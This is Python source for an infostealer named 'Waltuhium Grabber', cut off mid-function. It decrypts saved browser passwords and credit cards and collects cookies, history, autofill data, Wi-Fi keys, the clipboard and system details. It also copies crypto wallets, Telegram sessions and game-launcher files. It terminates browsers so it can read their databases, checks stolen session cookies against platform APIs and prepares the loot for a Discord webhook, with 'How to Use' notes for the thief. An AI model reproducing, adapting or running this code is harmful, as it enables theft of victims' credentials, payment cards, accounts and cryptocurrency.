# Waltuhium Grabber All Rights Recieved
# Coded by Waltuh
# https://t.me/waltuhium

import ctypes, platform
import json, sys
import shutil
import sqlite3
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import re
import os
import asyncio
import aiohttp
import base64
import time


webhook = '%WEBHOOK%'
discord_injection = bool("%injection%")
startup_method = "%startup_method%".lower()
Anti_VM = bool("%Anti_VM%")
FakeError = (bool("%fake_error%"), ("System Error", "The Program can't start because api-ms-win-crt-runtime-|l1-1-.dll is missing from your computer. Try reinstalling the program to fix this problem", 0))
StealFiles = bool("%StealCommonFiles%")

class Variables:
    Passwords = list()
    Cards = list()
    Cookies = list()
    Historys = list()
    Downloads = list()
    Autofills = list()
    Bookmarks = list()
    Wifis = list()
    SystemInfo = list()
    ClipBoard = list()
    Processes = list()
    Network = list()
    FullTokens = list()
    ValidatedTokens = list()
    DiscordAccounts = list()
    SteamAccounts = list()
    InstagramAccounts = list()
    TwitterAccounts = list()
    TikTokAccounts = list()
    RedditAccounts = list()
    TwtichAccounts = list()
    SpotifyAccounts = list()
    RobloxAccounts = list()
    RiotGameAccounts = list()

class SubModules:
    # Calls the CryptUnprotectData function from crypt32.dll
    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes: 

        class DATA_BLOB(ctypes.Structure):

            _fields_ = [
                ("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
            ]
        
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None

        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode("utf-16")
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))

        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)

        raise ValueError("Invalid encrypted_data provided!")

    @staticmethod
    def GetKey(FilePath:str) -> bytes:
        with open(FilePath,"r", encoding= "utf-8", errors= "ignore") as file:
            jsonContent: dict = json.load(file)

            encryptedKey: str = jsonContent["os_crypt"]["encrypted_key"]
            encryptedKey = base64.b64decode(encryptedKey.encode())[5:]

            return SubModules.CryptUnprotectData(encryptedKey)

    @staticmethod
    def Decrpytion(EncrypedValue: bytes, EncryptedKey: bytes) -> str:
        try:
            version = EncrypedValue.decode(errors="ignore")
            if version.startswith("v10") or version.startswith("v11"):
                iv = EncrypedValue[3:15]
                password = EncrypedValue[15:]
                authentication_tag = password[-16:]  # Extract the last 16 bytes as the authentication tag
                password = password[:-16]  # Remove the authentication tag from the password
                backend = default_backend()
                cipher = Cipher(algorithms.AES(EncryptedKey), modes.GCM(iv, authentication_tag), backend=backend)
                decryptor = cipher.decryptor()
                decrypted_password = decryptor.update(password) + decryptor.finalize()
                return decrypted_password.decode('utf-8')
            else:
                return str(SubModules.CryptUnprotectData(EncrypedValue))
        except:
            return "Decryption Error!, Data cant be decrypt"
        
    @staticmethod
    def create_mutex(mutex_value) -> bool:
        kernel32 = ctypes.windll.kernel32 #kernel32.dll 
        mutex = kernel32.CreateMutexA(None, False, mutex_value) # creating mutex
        return kernel32.GetLastError() != 183 # return if the mutex created successfully or not
    
    @staticmethod
    def IsAdmin() -> bool:
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except:
            return False


class StealSystemInformation:
    async def FunctionRunner(self) -> None:
        try:
            tasks = [
                asyncio.create_task(self.StealSystemInformation()),
                asyncio.create_task(self.StealWifiInformation()),
                asyncio.create_task(self.StealProcessInformation()),
                asyncio.create_task(self.StealNetworkInformation()),
                asyncio.create_task(self.StealLastClipBoard()),
            ]

            await asyncio.gather(*tasks)
        except Exception as error:
            print(f"[-] An error occured while starting processes at the same time for steal system information, Error code => \"{error}\"")

    async def GetDefaultSystemEncoding(self) -> str:
        try:
            cmd = "cmd.exe /c chcp"
            process = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
            stdout, stderr = await process.communicate()
            return stdout.decode(errors="ignore").split(":")[1].strip()
        except:
            return "null"

    async def StealSystemInformation(self) -> None:
        try:
            print("[+] Stealing system information")
            current_code_page = await self.GetDefaultSystemEncoding()
            result = await asyncio.create_subprocess_shell(r'echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Online User#### & query user & echo ####Local Group#### & net localgroup & echo ####Administrators Info#### & net localgroup administrators & echo ####Guest User Info#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipconfig#### & ipconfig/all & echo ####Hosts#### & type C:\WINDOWS\System32\drivers\etc\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####Firewallinfo#### & netsh firewall show state & netsh firewall show config', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
            stdout, stderr = await result.communicate()
            Variables.SystemInfo.append(stdout.decode(current_code_page))
            print("[+] System information was successfully stolen")
        except Exception as error:
            print(f"[-] An error occured while stealing system information, error code => \"{error}\"")

    async def StealProcessInformation(self) -> None:
        try:
            print("[+] Stealing running processes")
            process = await asyncio.create_subprocess_shell(
                "tasklist /FO LIST",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            stdout, stderr = await process.communicate()
            Variables.Processes.append(stdout.decode(errors="ignore"))
            print("[+] Running processes was successfully stolen")
        except Exception as error:
            print(f"[-] An error occured while stealing process information, => error code \"{error}\"")

    async def StealLastClipBoard(self) -> None:
        try:
            print("[+] Stealing Last ClipBoard Text")
            process = await asyncio.create_subprocess_shell(
                "powershell.exe Get-Clipboard",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                shell=True
            )
            stdout, stderr = await process.communicate()
            if stdout:
                Variables.ClipBoard.append(stdout.decode(errors="ignore")) 
            print("[+] Last ClipBoard Text was successfully stolen")
        except Exception as error:
            print(f"[-] An error occured while stealing \"Last Clipboard Text\", => error code \"{error}\"")

    async def StealNetworkInformation(self) -> None:
        try:
            print("[+] Stealing network information")
            async with aiohttp.ClientSession() as session:
                async with session.get("http://ip-api.com/json") as response:
                    data = await response.json()
                    ip = data["query"]
                    country = data["country"]
                    city = data["city"]
                    timezone = data["timezone"]
                    isp_info = data["isp"] + f" {data['org']} {data['as']}"
                    Variables.Network.append((ip, country, city, timezone, isp_info))
            print("[+] Network information was successfully stolen")
        except Exception as error:
            print(f"[-] An error occured while stealing network information, => error code \"{error}\"")

    async def StealWifiInformation(self) -> None:
        try:
            print("[+] Stealing wifi passwords")
            current_code_page = await self.GetDefaultSystemEncoding()

            process = await asyncio.create_subprocess_shell(
                "netsh wlan show profiles", 
                stdout=asyncio.subprocess.PIPE, 
                stderr=asyncio.subprocess.PIPE, 
                shell=True)
            
            stdout, stderr = await process.communicate()
            decoded_profiles = None

            try:
                decoded_profiles = stdout.decode(current_code_page)
            except:
                decoded_profiles = stdout.decode(errors="ignore")
            
            wifi_profile_names = re.findall(r'All User Profile\s*: (.*)', decoded_profiles)
            for profile_name in wifi_profile_names:
                result = await asyncio.create_subprocess_shell(
                    f'netsh wlan show profile name="{profile_name}" key=clear',
                    stdout=asyncio.subprocess.PIPE,
                    shell=True,
                    encoding=None
                )
                stdout, _ = await result.communicate()
                try:
                    profile_output = stdout.decode(current_code_page)
                except:profile_output = stdout.decode(errors="ignore")
                wifi_passwords = re.search(r'Key content\s*: (.*)', profile_output, re.IGNORECASE)

                Variables.Wifis.append((profile_name, wifi_passwords.group(1) if wifi_passwords else "No password found"))
            print("[+] Wifi passwords was successfully stolen")
        except Exception as error:
            print(f"[-] An error occurred while stealing wifi information, error code => \"{error}\"")


class Main:
    def __init__(self) -> None:
        self.profiles_full_path = list()
        self.RoamingAppData = os.getenv('APPDATA')
        self.LocalAppData = os.getenv('LOCALAPPDATA')
        self.Temp = os.getenv('TEMP') 
        self.FireFox = bool()
        self.FirefoxFilesFullPath = list()
        self.FirefoxCookieList = list()
        self.FirefoxHistoryList = list()
        self.FirefoxAutofiList = list()
    async def FunctionRunner(self):
        await self.kill_browsers()
        self.list_profiles()
        self.ListFirefoxProfiles()
        taskk = [
            asyncio.create_task(self.GetPasswords()),
            asyncio.create_task(self.GetCards()),
            asyncio.create_task(self.GetCookies()),
            asyncio.create_task(self.GetFirefoxCookies()),
            asyncio.create_task(self.GetHistory()),
            asyncio.create_task(self.GetFirefoxHistorys()),
            asyncio.create_task(self.GetDownload()),
            asyncio.create_task(self.GetBookMark()),
            asyncio.create_task(self.GetAutoFill()),
            asyncio.create_task(self.GetFirefoxAutoFills()),
            asyncio.create_task(self.GetSteamSession()),
            asyncio.create_task(self.GetTokens()),
            StealSystemInformation().FunctionRunner()
            ]
        await asyncio.gather(*taskk)
        await self.WriteToText()
        await self.SendAllData()
    def list_profiles(self) -> None:
        directorys = {
            'Google Chrome' : os.path.join(self.LocalAppData, "Google", "Chrome", "User Data"),
            'Opera'  : os.path.join(self.RoamingAppData, "Opera Software", "Opera Stable"),
            'Opera GX' : os.path.join(self.RoamingAppData, "Opera Software", "Opera GX Stable"),    
            'Brave' : os.path.join(self.LocalAppData, "BraveSoftware", "Brave-Browser", "User Data"),
            'Edge' : os.path.join(self.LocalAppData, "Microsoft", "Edge", "User Data"),
        }
        for junk, directory in directorys.items():
            if os.path.isdir(directory):
                if "Opera" in directory:
                    self.profiles_full_path.append(directory)
                else:
                    for root, folders, files in os.walk(directory):
                        for folder in folders:
                            folder_path = os.path.join(root, folder)
                            if folder == 'Default' or folder.startswith('Profile') or "Guest Profile" in folder:
                                self.profiles_full_path.append(folder_path)
    def ListFirefoxProfiles(self) -> None:
        try:
            directory = os.path.join(self.RoamingAppData , "Mozilla", "Firefox", "Profiles")
            if os.path.isdir(directory):
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        file_path = os.path.join(root, file)
                        if file.endswith("cookies.sqlite") or file.endswith("places.sqlite") or file.endswith("formhistory.sqlite"):
                            self.FirefoxFilesFullPath.append(file_path)
        except:
            pass
    async def kill_browsers(self):
        process_names = ["chrome.exe", "opera.exe", "edge.exe", "firefox.exe", "brave.exe"]
        process = await asyncio.create_subprocess_shell(
            'tasklist',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await process.communicate()
        if not process.returncode != 0:
            output_lines = stdout.decode(errors="ignore").split('\n')
            for line in output_lines:
                for process_name in process_names:
                    if process_name.lower() in line.lower():
                        parts = line.split()
                        pid = parts[1]
                        process = await asyncio.create_subprocess_shell(
                        f'taskkill /F /PID {pid}',
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE
                        )
                        await process.communicate()
    async def GetFirefoxCookies(self) -> None:
        try:
            for files in self.FirefoxFilesFullPath:
                if "cookie" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute('SELECT host, name, path, value, expiry FROM moz_cookies')
                    twitch_username = None
                    twitch_cookie = None
                    cookies = cursor.fetchall()
                    for cookie in cookies:
                        self.FirefoxCookieList.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cookie[3]}\n")
                        if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
                            asyncio.create_task(self.InstaSession(cookie[3], "Firefox"))
                        if "tiktok" in str(cookie[0]).lower() and str(cookie[1]) == "sessionid":
                            asyncio.create_task(self.TikTokSession(cookie[3], "Firefox"))
                        if "twitter" in str(cookie[0]).lower() and str(cookie[1]) == "auth_token":
                            asyncio.create_task(self.TwitterSession(cookie[3], "Firefox"))
                        if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
                            asyncio.create_task(self.RedditSession(cookie[3], "Firefox"))
                        if "spotify" in str(cookie[0]).lower() and "sp_dc" in str(cookie[1]).lower():
                            asyncio.create_task(self.SpotifySession(cookie[3], "Firefox"))
                        if "roblox" in str(cookie[0]).lower() and "ROBLOSECURITY" in str(cookie[1]):
                            asyncio.create_task(self.RobloxSession(cookie[3], "Firefox"))
                        if "twitch" in str(cookie[0]).lower() and "auth-token" in str(cookie[1]).lower():
                            twitch_cookie = cookie[3]
                        if "twitch" in str(cookie[0]).lower() and str(cookie[1]).lower() == "login":
                            twitch_username = cookie[3]
                        if not twitch_username == None and not twitch_cookie == None:
                            asyncio.create_task(self.TwitchSession(twitch_cookie, twitch_username, "Firefox"))
                            twitch_username = None
                            twitch_cookie = None
                        if "account.riotgames.com" in str(cookie[0]).lower() and "sid" in str(cookie[1]).lower():
                            asyncio.create_task(self.RiotGamesSession(cookie[3], "Firefox"))
        except:
            pass
        else:
            self.FireFox = True
    async def GetFirefoxHistorys(self) -> None:
        try:
            for files in self.FirefoxFilesFullPath:
                if "places" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute('SELECT id, url, title, visit_count, last_visit_date FROM moz_places')
                    historys = cursor.fetchall()
                    for history in historys:
                        self.FirefoxHistoryList.append(f"ID: {history[0]}\nRL: {history[1]}\nTitle: {history[2]}\nVisit Count: {history[3]}\nLast Visit Time: {history[4]}\n====================================================================================\n")
        except:
            pass
        else:
            self.FireFox = True
    async def GetFirefoxAutoFills(self) -> None:
        try:
            for files in self.FirefoxFilesFullPath:
                if "formhistory" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute("select * from moz_formhistory")
                    autofills = cursor.fetchall()
                    for autofill in autofills:
                        self.FirefoxAutofiList.append(f"{autofill}\n")
        except:
            pass
        else:
            self.FireFox = True
    async def GetPasswords(self) -> None:
        try:
            for path in self.profiles_full_path:
                BrowserName = "None"
                index = path.find("User Data")
                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                    BrowserName = "Opera"
                else:
                    text = path.split("\\")
                    BrowserName = text[-4] + " " + text[-3]
                key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
                LoginData = os.path.join(path, "Login Data")
                copied_file_path = os.path.join(self.Temp, "Logins.db")
                shutil.copyfile(LoginData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select origin_url, username_value, password_value from logins')
                logins = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for login in logins:
                    if login[0] and login[1] and login[2]:
                        Variables.Passwords.append(f"URL : {login[0]}\nUsername : {login[1]}\nPassword : {SubModules.Decrpytion(login[2], key)}\nBrowser : {BrowserName}\n======================================================================\n")
        except:
            pass
    async def GetCards(self) -> None:
        try:
            for path in self.profiles_full_path:
                index = path.find("User Data")
                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
                WebData = os.path.join(path, "Web Data")
                copied_file_path = os.path.join(self.Temp, "Web.db")
                shutil.copyfile(WebData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select card_number_encrypted, expiration_year, expiration_month, name_on_card from credit_cards')
                cards = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for card in cards:
                    if card[2] < 10:
                        month = "0" + str(card[2])
                    else:month = card[2]
                    Variables.Cards.append(f"{SubModules.Decrpytion(card[0], key)}\t{month}/{card[1]}\t{card[3]}\n")
        except:
            pass 
    async def GetCookies(self) -> None:
        try:
            for path in self.profiles_full_path:
                BrowserName = "None"
                index = path.find("User Data")
                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                    BrowserName = "Opera"
                else:
                    text = path.split("\\")
                    BrowserName = text[-4] + " " + text[-3]
                key = SubModules.GetKey(os.path.join(user_data_part, "Local State"))
                CookieData = os.path.join(path, "Network", "Cookies")
                copied_file_path = os.path.join(self.Temp, "Cookies.db")
                try:
                    shutil.copyfile(CookieData, copied_file_path)
                except:
                    pass
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select host_key, name, path, encrypted_value,expires_utc from cookies')
                cookies = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                twitch_username = None
                twitch_cookie = None
                for cookie in cookies:
                    dec_cookie = SubModules.Decrpytion(cookie[3], key)
                    Variables.Cookies.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{dec_cookie}\n")
                    if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
                        asyncio.create_task(self.InstaSession(dec_cookie, BrowserName))
                    if "tiktok" in str(cookie[0]).lower() and str(cookie[1]) == "sessionid":
                        asyncio.create_task(self.TikTokSession(dec_cookie, BrowserName))
                    if "twitter" in str(cookie[0]).lower() and str(cookie[1]) == "auth_token":
                        asyncio.create_task(self.TwitterSession(dec_cookie, BrowserName))
                    if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
                        asyncio.create_task(self.RedditSession(dec_cookie, BrowserName))
                    if "spotify" in str(cookie[0]).lower() and "sp_dc" in str(cookie[1]).lower():
                        asyncio.create_task(self.SpotifySession(dec_cookie, BrowserName))
                    if "roblox" in str(cookie[0]).lower() and "ROBLOSECURITY" in str(cookie[1]):
                        asyncio.create_task(self.RobloxSession(dec_cookie, BrowserName))
                    if "twitch" in str(cookie[0]).lower() and "auth-token" in str(cookie[1]).lower():
                        twitch_cookie = dec_cookie
                    if "twitch" in str(cookie[0]).lower() and str(cookie[1]).lower() == "login":
                        twitch_username = dec_cookie
                    if not twitch_username == None and not twitch_cookie == None:
                        asyncio.create_task(self.TwitchSession(twitch_cookie, twitch_username, BrowserName))
                        twitch_username = None
                        twitch_cookie = None
                    if "account.riotgames.com" in str(cookie[0]).lower() and "sid" in str(cookie[1]).lower():
                        asyncio.create_task(self.RiotGamesSession(dec_cookie, BrowserName))
        except:
            pass
    async def GetWallets(self, copied_path:str) -> None:
        try:
            wallets_ext_names = {
                "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
                "Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
                "Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
                "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
                "Ronin": "fnjhmkhhmkbjkkabndcnnogagogbneec",
                "Exodus": "aholpfdialjgjfhomihkjbmgjidlcdno",
                "Coin98": "aeachknmefphepccionboohckonoeemg",
                "KardiaChain": "pdadjkfkgcafgbceimcpbkalnfnepbnk",
                "TerraStation": "aiifbnbfobpmeekipheeijimdpnlpgpp",
                "Wombat": "amkmjjmmflddogmhpjloimipbofnfjih",
                "Harmony": "fnnegphlobjdpkhecapkijjdkgcjhkib",
                "Nami": "lpfcbjknijpeeillifnkikgncikgfhdo",
                "MartianAptos": "efbglgofoippbgcjepnhiblaibcnclgk",
                "Braavos": "jnlgamecbpmbajjfhmmmlhejkemejdma",
                "XDEFI": "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
                "Yoroi": "ffnbelfdoeiohenkjibnmadjiehjhajb",
                "TON": "nphplpgoakhhjchkkhmiggakijnkhfnd",
                "Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
                "MetaMask_Edge": "ejbalbakoplchlghecdalmeeeajnimhm",
                "Tron": "ibnejdfjmmkpcnlpebklmnkoeoihofec",}
            wallet_local_paths = {
                "Bitcoin": os.path.join(self.RoamingAppData, "Bitcoin", "wallets"),
                "Zcash": os.path.join(self.RoamingAppData, "Zcash"),
                "Armory": os.path.join(self.RoamingAppData, "Armory"),
                "Bytecoin": os.path.join(self.RoamingAppData, "bytecoin"),
                "Jaxx": os.path.join(self.RoamingAppData, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"),
                "Exodus": os.path.join(self.RoamingAppData, "Exodus", "exodus.wallet"),
                "Ethereum": os.path.join(self.RoamingAppData, "Ethereum", "keystore"),
                "Electrum": os.path.join(self.RoamingAppData, "Electrum", "wallets"),
                "AtomicWallet": os.path.join(self.RoamingAppData, "atomic", "Local Storage","leveldb"),
                "Guarda": os.path.join(self.RoamingAppData, "Guarda", "Local Storage","leveldb"),
                "Coinomi": os.path.join(self.RoamingAppData, "Coinomi", "Coinomi", "wallets"),
            }
            os.mkdir(os.path.join(copied_path, "Wallets"))
            for path in self.profiles_full_path:
                ext_path = os.path.join(path, "Local Extension Settings") 
                if os.path.exists(ext_path):
                    for wallet_name, wallet_addr in wallets_ext_names.items():
                        if os.path.isdir(os.path.join(ext_path, wallet_addr)):
                            try:
                                splited = os.path.join(ext_path, wallet_addr).split("\\")
                                file_name = f"{splited[5]} {splited[6]} {splited[8]} {wallet_name}"
                                os.makedirs(copied_path  + "\\Wallets\\" + file_name)
                                shutil.copytree(os.path.join(ext_path, wallet_addr), os.path.join(copied_path, "Wallets", file_name, wallet_addr))
                            except:
                                continue
            for wallet_names, wallet_paths in wallet_local_paths.items():
                try:
                    if os.path.exists(wallet_paths):
                        shutil.copytree(wallet_paths, os.path.join(copied_path, "Wallets", wallet_names))
                except:continue
        except:
            pass
    async def GetHistory(self) -> None:
        try:
            for path in self.profiles_full_path:
                HistoryData = os.path.join(path, "History")
                copied_file_path = os.path.join(self.Temp, "HistoryData.db")
                shutil.copyfile(HistoryData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select id, url, title, visit_count, last_visit_time from urls')
                historys = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for history in historys:
                    Variables.Historys.append(f"ID : {history[0]}\nURL : {history[1]}\nitle : {history[2]}\nVisit Count : {history[3]}\nLast Visit Time {history[4]}\n====================================================================================\n")
        except:
            pass

    async def GetAutoFill(self) -> None:
        try:
            for path in self.profiles_full_path:
                AutofillData = os.path.join(path, "Web Data")
                copied_file_path = os.path.join(self.Temp, "AutofillData.db")
                shutil.copyfile(AutofillData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select * from autofill')
                autofills = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for autofill in autofills:
                    if autofill:
                        Variables.Autofills.append(f"{autofill}\n")
        except Exception as e:print(e)

    async def GetBookMark(self) -> None:
        try:
            for path in self.profiles_full_path:
                BookmarkData = os.path.join(path, "Bookmarks")
                if os.path.isfile(BookmarkData):
                    with open(BookmarkData, "r", encoding="utf-8", errors="ignore") as file:
                        data = json.load(file)
                    data = data["roots"]["bookmark_bar"]["children"]
                    if data:
                        Variables.Bookmarks.append(f"Browser Path : {path}\nID : {data['id']}\nName : {data['name']}\nURL : {data['url']}\nGUID : {data['guid']}\nAdded At : {data['date_added']}\n\n=========================================================")
        except:
            pass
    async def GetDownload(self) -> None:
        try:
            for path in self.profiles_full_path:
                DownloadData = os.path.join(path, "History")
                copied_file_path = os.path.join(self.Temp, "DownloadData.db")
                shutil.copyfile(DownloadData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select tab_url, target_path from downloads')
                downloads = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for download in downloads:
                    Variables.Downloads.append(f"Downloaded URL: {download[0]}\nDownloaded Path: {download[1]}\n\n")
        except:
            pass
    async def StealUplay(self, uuid:str) -> None:
        try:
            found_ubisoft = False
            ubisoft_path = os.path.join(self.LocalAppData, "Ubisoft Game Launcher")
            copied_path = os.path.join(self.Temp, uuid, "Games", "Uplay")
            if os.path.isdir(ubisoft_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                for file in os.listdir(ubisoft_path):
                    name_of_files = os.path.join(ubisoft_path, file)
                    try:
                        shutil.copy(name_of_files, os.path.join(copied_path, file))
                        found_ubisoft = True
                    except:
                        continue
                if found_ubisoft == True:
                    os.mkdir(os.path.join(copied_path, "How to Use"))
                    with open(os.path.join(copied_path,"How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                        write_file.write("https://t.me/waltuhium\n==============================================\n")
                        write_file.write("First, open this file path on your computer <%localappdata%\\Ubisoft Game Launcher>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run ubisoft")
        except:
            pass
    async def StealEpicGames(self, uuid:str) -> None:
        try:
            found_epic = False
            epic_path = os.path.join(self.LocalAppData, "EpicGamesLauncher", "Saved", "Config", "Windows")
            copied_path = os.path.join(self.Temp, uuid, "Games", "Epic Games")
            if os.path.isdir(epic_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                try:
                    shutil.copytree(epic_path, os.path.join(copied_path, "Windows"))
                    found_epic = True
                except:
                    pass
            if found_epic == True:
                with open(os.path.join(copied_path, "How to Use.txt"), "a", errors="ignore") as write_file:
                    write_file.write("https://t.me/waltuhium\n==============================================\n")
                    write_file.write("First, open this file path on your computer <%localappdata%\\EpicGamesLauncher\\Saved\\Config\\Windows>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run epic games")
        except Exception as e:
            print(str(e))
    async def StealGrowtopia(self, uuid:str) -> None:
        try:
            found_growtopia = False
            growtopia_path = os.path.join(self.LocalAppData, "Growtopia", "save.dat")
            copied_path = os.path.join(self.Temp, uuid, "Games", "Growtopia")
            if os.path.isfile(growtopia_path):
                found_growtopia = True
                shutil.copy(growtopia_path, os.path.join(copied_path, "save.dat"))
            if found_growtopia == True:
                os.mkdir(os.path.join(copied_path, "How to Use"))
                with open(os.path.join(copied_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                    write_file.write("https://t.me/waltuhium\n==============================================\n")
                    write_file.write("First, open this file path on your computer <%localappdata%\\Growtopia>.\nReplace 'save.dat' with the stolen file.")
        except:
            pass
    async def StealTelegramSession(self, directory_path: str) -> None:
        try:
            found_tg = False
            tg_path = os.path.join(self.RoamingAppData, "Telegram Desktop", "tdata")
            if os.path.exists(tg_path):
                copy_path = os.path.join(directory_path, "Telegram Session")
                black_listed_dirs = ["dumps", "emojis", "user_data", "working", "emoji", "tdummy", "user_data#2", "user_data#3", "user_data#4", "user_data#5"]
                processes = await asyncio.create_subprocess_shell(f"taskkill /F /IM Telegram.exe", shell=True, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                await processes.communicate() 
                if not os.path.exists(copy_path):
                    os.mkdir(copy_path)
                for dirs in os.listdir(tg_path):
                    try:
                        _path = os.path.join(tg_path, dirs)
                        if not dirs in black_listed_dirs:
                            dir_name = _path.split("\\")[7]
                            if os.path.isfile(_path):
                                shutil.copyfile(_path, os.path.join(copy_path, dir_name))
                            elif os.path.isdir(_path):
                                shutil.copytree(_path, os.path.join(copy_path, dir_name))
                            found_tg = True
                    except:continue
                if found_tg == True:
                    os.mkdir(os.path.join(copy_path, "How to Use"))
                    with open(os.path.join(copy_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                        write_file.write("https://t.me/waltuhium\n=======================================\n")
                        write_file.write("First, close your telegram\nopen this file path on your computer <%appdata%\\Telegram Desktop\\tdata>.\nDelete all the files here, then copy the stolen files to this folder")
        except:
            pass
    async def RiotGamesSession(self, cookie, browser:str) -> None:
        try:
            connector = aiohttp.TCPConnector(ssl=True)  
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get('https://account.riotgames.com/api/account/v1/user', headers={"Cookie": f"sid={cookie}"}) as req:
                    response = await req.json()
                embed_data = {
                    "title": "***Waltuhium Grabber***",
                    "description": f"***Waltuhium Riot Games Session was detected on the {browser} browser***",
                    "url" : "https://t.me/waltuhium",
                    "color": 0,
                    "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuhium23/waltuhium"},
                    "thumbnail": {"url": "https://i.hizliresim.com/qxnzimj.jpg"}}
                username = str(response["username"])
                email = str(response["email"])
                region = str(response["region"])
                locale = str(response["locale"])
                country = str(response["country"])
                mfa = str(response["mfa"]["verified"])
                fields = [
                    {"name": "Username", "value": "``" + username + "``", "inline": True},
                    {"name": "Email", "value": "``" + email + "``", "inline": True},
                    {"name": "Region", "value": "``" +  region + "``", "inline": True},
                    {"name": "Locale", "value": "``" + locale + "``", "inline": True},
                    {"name": "Country", "value":"``" + country  + "``", "inline": True},
                    {"name": "MFA Enabled?", "value": "``" + mfa + "``", "inline": True},
                    {"name": "Cookie", "value": "``" + cookie + "``", "inline": False},]
                embed_data["fields"] = fields
                payload = {
                    "username": "waltuhium | t.me/waltuhium",
